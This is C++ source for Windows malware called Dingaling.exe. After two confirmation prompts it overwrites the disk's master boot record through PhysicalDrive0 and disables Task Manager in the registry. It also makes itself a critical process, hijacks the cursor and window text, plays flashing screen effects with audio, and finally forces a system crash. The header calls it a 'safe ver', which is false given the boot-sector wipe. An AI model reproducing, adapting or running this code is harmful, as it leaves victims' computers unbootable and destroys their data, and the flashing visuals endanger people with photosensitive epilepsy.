// Dingaling.cpp : By comi97!
// NOT FOR N17Pro3426 and Nyfol
// safe ver

#include <windows.h>
#include <tchar.h>
#include <ctime>
#include <iostream>
#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#include <math.h>
#include <time.h>
#define PI   3.14159265358979323846264338327950288
#define min(x, y) ((x)<(y)?(x):(y))
#define max(x, y) ((x)>(y)?(x):(y))
#include "BootHeader.hpp" // Clearing things up a lil'...
#include "CritProcessHdr.hpp"

EXTERN_C NTSTATUS WINAPI RtlAdjustPrivilege(DWORD, BYTE, BYTE, LPBYTE);
EXTERN_C NTSTATUS WINAPI NtRaiseHardError(NTSTATUS, DWORD, DWORD, PULONG_PTR, DWORD, LPDWORD);


WINBOOL CheckForWindowsXP() {
	OSVERSIONINFOA osvi;
	ZeroMemory(&osvi, sizeof(OSVERSIONINFOA));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
	GetVersionExA(&osvi);
	if (osvi.dwMajorVersion == 5) {
		return true;
	}
	return false;
}

typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;

typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	//OBS: I used it in 3 payloads

	//Btw ArTicZera created HSV functions, but it sucks unfortunatelly
	//So I didn't used in this malware.

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF GetUnknownColors(int length) {
    if (red != length) {
        red < length; red++;
        if (ifblue == true) {
            return RGB(red, 255, length);
        }
        else {
            return RGB(red, 255, 255);
        }
    }
    else {
        if (green != length) {
            green < length; green++;
            return RGB(length, green, 255);
        }
        else {
            if (blue != length) {
                blue < length; blue++;
                return RGB(255, length, blue);
            }
            else {
                red = 255; green = 255; blue = 255;
                ifblue = true;
            }
        }
    }
}

DWORD WINAPI shader1 (LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				int fx = (int)((8 * i) + ((8 * i) * ceil(x / 32.0)) + (4 * i) + ((4 * i) * tan(y / 24.0)));

				rgbquad[index].rgbRed += GetRValue(fx);
				rgbquad[index].rgbGreen += GetGValue(fx);
				rgbquad[index].rgbBlue += GetBValue(fx);
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}

	return 0x00;
}

DWORD WINAPI shader2(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)((i ^ 4) + (i * 4) * log(x * 1 ^ i * y + x ^ i + y + i * x + y));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
				hslcolor.s = 3.f;

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}


DWORD WINAPI plgblt(LPVOID lpParam) //credits to N17Pro3426 but i messed around with it
{
	HDC hdc = GetDC(0);
	RECT wRect;
	POINT wPt[3];
	while (1)
	{
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left - 50;
		wPt[0].y = wRect.top + 10;
		wPt[1].x = wRect.right - 100;
		wPt[1].y = wRect.top + 0;
		wPt[2].x = wRect.left - 0;
		wPt[2].y = wRect.bottom - 0;
		PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
	}
}

DWORD WINAPI balls(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	while (1) {
		HDC hdc = GetDC(0);
		int top_x = 0 + x;
		int top_y = 0 + y;
		int bottom_x = 300 + x;
		int bottom_y = 300 + y;
		x += incrementor * signX;
		y += incrementor * signY;
		HBRUSH brush = CreateSolidBrush(GetUnknownColors(239));
		SelectObject(hdc, brush);
		//Ellipse(hdc, top_x, top_y, bottom_x, bottom_y);
		Ellipse(hdc, top_x + 50, top_y + 50, x - 50, y - 50);
		Ellipse(hdc, top_x + 45, top_y + 45, x - 45, y - 45);
		Ellipse(hdc, top_x + 40, top_y + 40, x - 40, y - 40);
		Ellipse(hdc, top_x + 35, top_y + 35, x - 35, y - 35);
		Ellipse(hdc, top_x + 30, top_y + 30, x - 30, y - 30);
		Ellipse(hdc, top_x + 25, top_y + 25, x - 25, y - 25);
		Ellipse(hdc, top_x + 20, top_y + 20, x - 20, y - 20);
		Ellipse(hdc, top_x + 15, top_y + 15, x - 15, y - 15);
		Ellipse(hdc, top_x + 10, top_y + 10, x - 10, y - 10);
		Ellipse(hdc, top_x + 5, top_y + 5, x - 5, y - 5);
		if (y >= GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (x >= GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (y == 0)
		{
			signY = 1;
		}

		if (x == 0)
		{
			signX = 1;
		}
		Sleep(10);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI shader3(LPVOID lpParam) 
{
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;
                int j = 4 * i;

          
                int fx = (int)(j + (j * ceil(x / 16.0)) + j + (j * ceil(y / 8.0)) + j + (j * ceil((x + y) / 16.0)) + j + (j * sqrt(sin((double)(x * x + y * y)) / 8.0))) / 4;

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc); DeleteDC(hdc);
    }

    return 0x00;
}

/*DWORD WINAPI sines1(LPVOID lpParam) {
	HDC hdc = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double angle = 0;
	for (;;) {
		hdc = GetDC(0);
		for (float i = 0; i < sw + sh; i += 0.99f) {
			int a = sin(angle) * 20;
			BitBlt(hdc, i, 0, 1, sh, hdc, i, a, SRCCOPY);
			angle += M_PI / 40;
			DeleteObject(&a); DeleteObject(&i);
		}
		ReleaseDC(wnd, hdc);
		DeleteDC(hdc); DeleteObject(wnd); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
	}
}*/


DWORD WINAPI textouts(LPVOID lpvd)
{
	int x = GetSystemMetrics(0); int y = GetSystemMetrics(1);
	LPCSTR text = 0;
	LPCSTR text1 = 0;
	LPCSTR text2 = 0;
	LPCSTR text3 = 0;
	while (1)
	{
		HDC hdc = GetDC(0);
		SetBkMode(hdc, 0);
		text = "Dingaling.exe";
		text1 = "comium97";
		text2 = "Can you legitimately die?";
		text3 = "You are so stupid!";
		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		HFONT font = CreateFontA(43, 32, 0, 0, FW_EXTRALIGHT, 0, 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Baby Kruffy"); // OFMFGMMGMGMGMGMFMGNM TOOPHENYLOOSRINE!!!!!111111!!!!1
		SelectObject(hdc, font);
		TextOutA(hdc, rand() % x, rand() % y, text, strlen(text));
		Sleep(10);
		TextOutA(hdc, rand() % x, rand() % y, text1, strlen(text1));
		Sleep(10);
		TextOutA(hdc, rand() % x, rand() % y, text2, strlen(text2));
		Sleep(10);
		TextOutA(hdc, rand() % x, rand() % y, text3, strlen(text3));
		DeleteObject(font);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI train1(LPVOID lpParam) // Credits to N17Pro3426 for the train effect but i modded it ;)
{
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    while (1)
    {
        HDC hdc = GetDC(0);
        BitBlt(hdc, 0, 0, w, h, hdc, 0, 30, NOTSRCCOPY);
    BitBlt(hdc, 0, 0, w, h, hdc, 0, -h + 30, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
} 

VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8100, 8100, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t & t >> 9) - (t & t >> 11));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8100, 8100, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8100 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (54 & t >> 4));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8100, 8100, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8100 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t | t >> 55) ^ (t & t >> 75));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8100, 8100, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8100 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(10 * (t ^ 2 & t >> (t & 267 & t ^ 21)));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (((t & 4096) ? t % 65536 < 59392 ? 7 : t >> 6 : 16) + (1 & t >> 14)) >> (2 & -t >> ((t & 2048) ? 2 : 4)));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

void NotWindowsXP() {
  MessageBoxA(NULL, "nice try lil timmy your running a OS that has dwm on it. \r\ntry again next time kid!", "Dingaling.exe - Exception Occurred", MB_ICONERROR|MB_OK);
  exit(0);
}

// Destruction (Added by NotCCR) //

DWORD failedtooverwrite() {
	MessageBoxW(NULL, L"This PC will crash in 5 seconds, it failed to get its bootloader destroyed.", L"Exception", MB_OK|MB_ICONERROR);
}

VOID NTAPI NtRaiseError(NTSTATUS ntExitCode) {
	BYTE ntBool;
	DWORD dwResponse;
	RtlAdjustPrivilege(19, true, false, &ntBool);
	NtRaiseHardError(ntExitCode, 0, 0, 0, 6, &dwResponse);
}

void WriteToSectors(void) {
	DWORD dwBootBits;
	HANDLE hSctr = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hSctr == INVALID_HANDLE_VALUE) {
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)failedtooverwrite, NULL, 0, 0);
		Sleep(5000);
		CloseHandle(hSctr);
		NtRaiseError(0xc000001f);
	}
	WriteFile(hSctr, bootrec, 32768, &dwBootBits, NULL);
	CloseHandle(hSctr);
}

int CALLBACK EnumChildProc(HWND hwnd, LONG_PTR lPtr) {
    LPCWSTR lpLabel = L"" + rand() % 512;
    if (GetWindowLongW(hwnd, GWL_STYLE)&WS_VISIBLE) SendMessageW(hwnd, WM_SETTEXT, 0, (LONG_PTR)lpLabel);
    return true;
}

DWORD CALLBACK MessLabels(LPVOID pvoid) {
    while (true) {
        HWND hwnd = FindWindowW(NULL, L"" + rand() % 512);
        EnumChildWindows(hwnd, &EnumChildProc, 0);
        Sleep(10);
    }
}

DWORD CALLBACK MoveCursor(LPVOID pvoid) {
	while (true) {
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		SetCursorPos(rand() % w, h);
	}
}

LONG WINAPI RegAddW(HKEY hKey, LPCWSTR lpRegistryKey, LPCWSTR lpRegName, DWORD dwRegType, BYTE bValue) {
    HKEY hKResult;
    RegCreateKeyW(hKey, lpRegistryKey, &hKResult);
    RegSetValueExW(hKResult, lpRegName, 0, dwRegType, &bValue, sizeof(bValue));
    RegCloseKey(hKResult);
}

int CALLBACK WinMain(
	HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine, int       nCmdShow // Copied.
)
{
	if (MessageBoxW(NULL, L"This is a Malware,\nClick yes to run.\nClick no to exit.", L"Dingaling.exe by comium97", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		return 0;
	}
	else
	{
		if (MessageBoxW(NULL, L"Are you sure? It still contains flashing lights - NOT for epilepsy", L"F?i?n?a?l? ?W?a?r?n?i?n?g? - Dingaling.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			return 0;
		}
		else
		{
    	if (!CheckForWindowsXP()) NotWindowsXP();
    	WriteToSectors();
    	RegAddW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\POLICIES\\SYSTEM", L"DisableTaskmgr", REG_DWORD, 1);
    	SetCritProcess();
		Sleep(8000);
	//	CreateThread(0, 0, fakeerror, 0, 0, 0);
	  MessageBoxW(NULL, L"The Task Manager has been destroyed!", L"Dingaling.exe - Success", MB_ICONINFORMATION);
	  	CreateThread(NULL, 0, MessLabels, NULL, 0, 0);
	  	CreateThread(NULL, 0, MoveCursor, NULL, 0, 0);
		Sleep(3000);
		HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
		//HANDLE thread1dot1 = CreateThread(0, 0, shaking, 0, 0, 0);
		sound1();
		Sleep(30000);
		TerminateThread(thread1, 0);
		CloseHandle(thread1);
		InvalidateRect(0, 0, 0);
		HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
		//HANDLE thread2dot1 = CreateThread(0, 0, balls, 0, 0, 0);
		sound2();
		Sleep(30000);
		TerminateThread(thread2, 0);
		CloseHandle(thread2);
		InvalidateRect(0, 0, 0);		
		HANDLE thread3 = CreateThread(0, 0, plgblt, 0, 0, 0);
	    CreateThread(0, 0, balls, 0, 0, 0);
		sound3();
		Sleep(30000);
		TerminateThread(thread3, 0);
		CloseHandle(thread3);
		InvalidateRect(0, 0, 0);	
		HANDLE thread4 = CreateThread(0, 0, shader3, 0, 0, 0);
		CreateThread(0, 0, textouts, 0, 0, 0);
		sound4();
		Sleep(30000);
		TerminateThread(thread4, 0);
		CloseHandle(thread4);
		InvalidateRect(0, 0, 0);	
		HANDLE thread5 = CreateThread(0, 0, train1, 0, 0, 0);
		sound5();
		Sleep(30000);
		TerminateThread(thread5, 0);
		CloseHandle(thread5);
		InvalidateRect(0, 0, 0);
		NtRaiseError(0xc000001f);

            	}
		
    	}
}

